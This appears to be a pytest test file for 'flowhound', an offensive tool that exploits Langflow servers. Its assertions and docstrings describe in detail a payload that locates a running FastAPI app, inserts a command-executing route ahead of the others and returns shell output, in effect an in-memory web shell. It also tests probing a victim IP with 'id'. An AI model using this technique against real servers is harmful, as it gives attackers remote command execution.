from concurrent.futures import TimeoutError as FutureTimeoutError
from unittest.mock import MagicMock, patch

import click
import pytest
from click.testing import CliRunner

from flowhound.cli.command import _get_payload, _probe_bind_langflow_http, attack
from flowhound.vulnerabilities.exploits.base_exploit_class import ExploitBaseClass
from flowhound.vulnerabilities.io.database import Database
from flowhound.vulnerabilities.payloads.bind_langflow_http_shell import (
    BIND_LANGFLOW_HTTP_ROUTE,
)
from flowhound.vulnerabilities.payloads.bind_langflow_http_shell import (
    Payload as BindLangflowHttpShellPayload,
)

# ---------------------------------------------------------------------------
# Payload class
# ---------------------------------------------------------------------------


def test_bind_langflow_http_payload_creation():
    p = BindLangflowHttpShellPayload(rhost="192.168.1.30", rport=7860)
    assert isinstance(p, BindLangflowHttpShellPayload)


def test_bind_langflow_http_payload_stores_rhost_and_rport():
    p = BindLangflowHttpShellPayload(rhost="192.168.1.30", rport=7860)
    assert p.rhost == "192.168.1.30"
    assert p.rport == 7860


def test_bind_langflow_http_payload_is_not_blocking():
    p = BindLangflowHttpShellPayload(rhost="192.168.1.30", rport=7860)
    assert p.blocking is False


def test_bind_langflow_http_payload_load_payload_returns_string():
    p = BindLangflowHttpShellPayload(rhost="192.168.1.30", rport=7860)
    assert isinstance(p.load_payload(), str)


def test_bind_langflow_http_payload_uses_gc_to_find_app():
    """Payload must find the FastAPI instance that already owns /api/v1/ routes."""
    p = BindLangflowHttpShellPayload(rhost="192.168.1.30", rport=7860)
    code = p.load_payload()
    assert "gc.get_objects" in code
    assert "FastAPI" in code
    assert "/api/v1/" in code


def test_bind_langflow_http_payload_checks_nested_included_router():
    """Selector must reconstruct full paths via include_context.prefix because
    FastAPI >=0.137 wraps sub-routers in _IncludedRouter objects whose
    original_router.routes carry only the sub-prefix (e.g. '/v1/validate/code'),
    not the accumulated full path ('/api/v1/validate/code'). A flat .path check
    always returned False; the fix walks include_context.prefix recursively."""
    p = BindLangflowHttpShellPayload(rhost="192.168.1.30", rport=7860)
    code = p.load_payload()
    assert "original_router" in code
    assert "include_context" in code
    assert "_has_api_v1" in code


def test_bind_langflow_http_payload_out_only_set_on_success():
    """_out must be inside the 'if _app is not None' branch, not unconditional.
    Previously _out was set after the if-block which gave a false-positive result
    even when _app was None and add_api_route was never called."""
    p = BindLangflowHttpShellPayload(rhost="192.168.1.30", rport=7860)
    code = p.load_payload()
    # The success _out must appear after the if-block body (indented), not at top level
    registered_idx = code.index("'bind_langflow_http route registered'")
    not_found_idx = code.index("'bind_langflow_http app not found'")
    # Both branches must be present
    assert registered_idx > 0
    assert not_found_idx > registered_idx  # else-branch comes after if-branch
    # The not-found branch confirms the else path exists
    assert "bind_langflow_http app not found" in code


def test_bind_langflow_http_payload_calls_add_api_route():
    """Route is inserted via routes.insert(0, APIRoute(...)) so it is
    evaluated before any _IncludedRouter wrappers in the dispatch list."""
    p = BindLangflowHttpShellPayload(rhost="192.168.1.30", rport=7860)
    code = p.load_payload()
    assert "APIRoute" in code
    assert "routes.insert" in code


def test_bind_langflow_http_payload_adds_route_to_router_not_app():
    """Route must be inserted into app.router.routes so Starlette's live
    dispatcher sees it immediately without a middleware rebuild."""
    p = BindLangflowHttpShellPayload(rhost="192.168.1.30", rport=7860)
    code = p.load_payload()
    assert "_app.router.routes" in code


def test_bind_langflow_http_payload_inserts_at_index_zero():
    """Payload must insert at position 0 so it wins the dispatch race over
    _IncludedRouter wrappers that share a path prefix and return Match.PARTIAL,
    which would otherwise trigger a 405 Method Not Allowed response."""
    p = BindLangflowHttpShellPayload(rhost="192.168.1.30", rport=7860)
    code = p.load_payload()
    assert "routes.insert(0," in code
    assert "_mount_idx" not in code
    assert "isinstance(_r, Mount)" not in code


def test_bind_langflow_http_payload_uses_bind_langflow_http_route():
    p = BindLangflowHttpShellPayload(rhost="192.168.1.30", rport=7860)
    assert BIND_LANGFLOW_HTTP_ROUTE in p.load_payload()


def test_bind_langflow_http_payload_removes_stale_route_before_registering():
    """The payload must evict any existing route at _route_path before inserting
    the new one, so a re-run always installs the current handler."""
    p = BindLangflowHttpShellPayload(rhost="192.168.1.30", rport=7860)
    code = p.load_payload()
    # Old skip-if-present guard must be gone
    assert "_route_path not in _existing" not in code
    # New eviction filter must be present
    assert "getattr(_r, 'path', '') != _route_path" in code


def test_bind_langflow_http_payload_uses_subprocess_for_command_execution():
    p = BindLangflowHttpShellPayload(rhost="192.168.1.30", rport=7860)
    assert "subprocess.run" in p.load_payload()


def test_bind_langflow_http_payload_resets_openapi_schema():
    """openapi_schema must be cleared so FastAPI regenerates the schema."""
    p = BindLangflowHttpShellPayload(rhost="192.168.1.30", rport=7860)
    assert "openapi_schema = None" in p.load_payload()


def test_bind_langflow_http_payload_returns_json_response():
    """Handler must return JSONResponse, not PlainTextResponse."""
    p = BindLangflowHttpShellPayload(rhost="192.168.1.30", rport=7860)
    code = p.load_payload()
    assert "JSONResponse" in code
    assert "PlainTextResponse" not in code


def test_bind_langflow_http_payload_json_response_contains_output_and_returncode():
    """JSON body must include both 'output' and 'returncode' keys."""
    p = BindLangflowHttpShellPayload(rhost="192.168.1.30", rport=7860)
    code = p.load_payload()
    assert "'output'" in code
    assert "'returncode'" in code


def test_bind_langflow_http_payload_uses_subprocess_run_not_check_output():
    """subprocess.run is used so non-zero exit codes are captured rather than
    raising CalledProcessError, which would leave the caller with no response."""
    p = BindLangflowHttpShellPayload(rhost="192.168.1.30", rport=7860)
    code = p.load_payload()
    assert "subprocess.run" in code
    assert "check_output" not in code


# ---------------------------------------------------------------------------
# _get_payload dispatch
# ---------------------------------------------------------------------------


def test_get_payload_bind_langflow_http_returns_bind_langflow_http_payload():
    result = _get_payload(
        cmd=None,
        reverse_shell=None,
        bind_shell=None,
        bind_langflow_http="192.168.1.30:7860",
    )
    assert isinstance(result, BindLangflowHttpShellPayload)


def test_get_payload_bind_langflow_http_invalid_format_raises():
    with pytest.raises(click.BadParameter, match="HOST:PORT"):
        _get_payload(
            cmd=None,
            reverse_shell=None,
            bind_shell=None,
            bind_langflow_http="no-colon-here",
        )


def test_get_payload_bind_langflow_http_invalid_port_raises():
    with pytest.raises(click.BadParameter, match="Port must be between"):
        _get_payload(
            cmd=None,
            reverse_shell=None,
            bind_shell=None,
            bind_langflow_http="192.168.1.30:99999",
        )


def test_get_payload_bind_langflow_http_wildcard_host_raises():
    with pytest.raises(click.BadParameter, match="victim's reachable IP"):
        _get_payload(
            cmd=None,
            reverse_shell=None,
            bind_shell=None,
            bind_langflow_http="0.0.0.0:7860",
        )


# ---------------------------------------------------------------------------
# _probe_bind_langflow_http
# ---------------------------------------------------------------------------


def test_probe_bind_langflow_http_returns_true_on_200():
    mock_resp = MagicMock(status_code=200)
    mock_resp.json.return_value = {"output": "root\n", "returncode": 0}
    with patch(
        "flowhound.cli.command.requests.post", return_value=mock_resp
    ) as mock_post:
        assert _probe_bind_langflow_http("192.168.1.30", 7860) is True
        mock_post.assert_called_once_with(
            f"http://192.168.1.30:7860{BIND_LANGFLOW_HTTP_ROUTE}",
            json={"cmd": "id"},
            timeout=10,
        )


def test_probe_bind_langflow_http_returns_true_on_200_after_non_200():
    """In a multi-worker deployment the first N-1 requests may hit un-patched
    workers (returning non-200); the probe must keep retrying and return True
    as soon as one attempt gets HTTP 200."""
    with patch("flowhound.cli.command.requests.post") as mock_post:
        non_200 = MagicMock(status_code=404)
        ok_200 = MagicMock(status_code=200)
        ok_200.json.return_value = {"output": "root\n", "returncode": 0}
        # First five attempts hit un-patched workers, sixth hits the patched one.
        mock_post.side_effect = [non_200] * 5 + [ok_200]
        assert _probe_bind_langflow_http("192.168.1.30", 7860) is True
        assert mock_post.call_count == 6


def test_probe_bind_langflow_http_returns_false_on_non_200():
    with patch("flowhound.cli.command.requests.post") as mock_post:
        mock_resp = MagicMock(status_code=404)
        mock_post.return_value = mock_resp
        assert _probe_bind_langflow_http("192.168.1.30", 7860) is False


def test_probe_bind_langflow_http_logs_output_and_returncode(caplog):
    """Probe must log the JSON output and returncode on a successful 200."""
    import logging

    mock_resp = MagicMock(status_code=200)
    mock_resp.json.return_value = {"output": "uid=0(root)\n", "returncode": 0}
    with (
        patch("flowhound.cli.command.requests.post", return_value=mock_resp),
        caplog.at_level(logging.INFO, logger="flowhound.cli.command"),
    ):
        result = _probe_bind_langflow_http("192.168.1.30", 7860)

    assert result is True
    assert "uid=0(root)" in caplog.text
    assert "rc=0" in caplog.text


def test_probe_bind_langflow_http_logs_nonzero_returncode(caplog):
    """Probe must log a non-zero returncode so the caller can see failures."""
    import logging

    mock_resp = MagicMock(status_code=200)
    mock_resp.json.return_value = {
        "output": "sh: bad_cmd: not found\n",
        "returncode": 127,
    }
    with (
        patch("flowhound.cli.command.requests.post", return_value=mock_resp),
        caplog.at_level(logging.INFO, logger="flowhound.cli.command"),
    ):
        result = _probe_bind_langflow_http("192.168.1.30", 7860)

    assert result is True
    assert "rc=127" in caplog.text


def test_probe_bind_langflow_http_returns_false_on_connection_error():
    with patch("flowhound.cli.command.requests.post") as mock_post:
        import requests as req_lib

        mock_post.side_effect = req_lib.ConnectionError()
        assert _probe_bind_langflow_http("192.168.1.30", 7860) is False


def test_probe_bind_langflow_http_returns_false_on_timeout():
    with patch("flowhound.cli.command.requests.post") as mock_post:
        import requests as req_lib

        mock_post.side_effect = req_lib.Timeout()
        assert _probe_bind_langflow_http("192.168.1.30", 7860) is False


# ---------------------------------------------------------------------------
# _run_exploits — bind_langflow_http probe branches
# ---------------------------------------------------------------------------


def _make_bind_langflow_http_invocation(
    runner, db, bind_langflow_http_value, probe_result, exploit_side_effect=None
):
    """Helper: invoke attack with --bind_langflow_http and a mocked probe return value."""
    mock_vuln = MagicMock()
    mock_vuln.cve_id = "CVE-2026-9999"
    mock_vuln.application = "langflow"
    mock_vuln.min_impacted_version = "1.0.0"
    mock_vuln.max_impacted_version = "2.0.0"
    mock_vuln.get_module_instance.return_value = MagicMock(
        spec=ExploitBaseClass, output=None
    )
    db.retrieve_vulnerabilities.return_value = [mock_vuln]

    exploit_mock = (
        MagicMock(side_effect=exploit_side_effect)
        if exploit_side_effect is not None
        else MagicMock(return_value=True)
    )

    with (
        patch(
            "flowhound.cli.command.detect_target", return_value=("langflow", "1.0.0")
        ),
        patch("flowhound.cli.command._execute_exploit", exploit_mock),
        patch(
            "flowhound.cli.command._probe_bind_langflow_http", return_value=probe_result
        ),
    ):
        return runner.invoke(
            attack,
            [
                "--url",
                "http://localhost:7860",
                "--bind_langflow_http",
                bind_langflow_http_value,
            ],
            obj=db,
        )


def test_bind_langflow_http_exploit_succeeds_probe_live_reports_curl(caplog):
    """Exploit returns True and probe 200 — HTTP shell live with curl command."""
    import logging

    runner = CliRunner()
    db = MagicMock(spec=Database)

    with caplog.at_level(logging.INFO, logger="flowhound.cli.command"):
        result = _make_bind_langflow_http_invocation(
            runner, db, "192.168.1.30:7860", True
        )

    assert result.exit_code == 0
    assert "HTTP shell is live" in caplog.text
    assert "curl" in caplog.text


def test_bind_langflow_http_exploit_succeeds_probe_unreachable_reports_failure(caplog):
    """Exploit returns True but probe fails — route not reachable."""
    import logging

    runner = CliRunner()
    db = MagicMock(spec=Database)

    with caplog.at_level(logging.WARNING, logger="flowhound.cli.command"):
        result = _make_bind_langflow_http_invocation(
            runner, db, "192.168.1.30:7860", False
        )

    assert result.exit_code == 0
    assert "not reachable" in caplog.text


def test_bind_langflow_http_timeout_probe_live_reports_success(caplog):
    """FutureTimeoutError (non-blocking payload) falls through to non-blocking skip."""
    import logging

    runner = CliRunner()
    db = MagicMock(spec=Database)

    with caplog.at_level(logging.WARNING, logger="flowhound.cli.command"):
        result = _make_bind_langflow_http_invocation(
            runner,
            db,
            "192.168.1.30:7860",
            True,
            exploit_side_effect=FutureTimeoutError(),
        )

    # bind_langflow_http is non-blocking — FutureTimeoutError is treated as a skip
    assert result.exit_code == 0
    assert "timed out after" in caplog.text
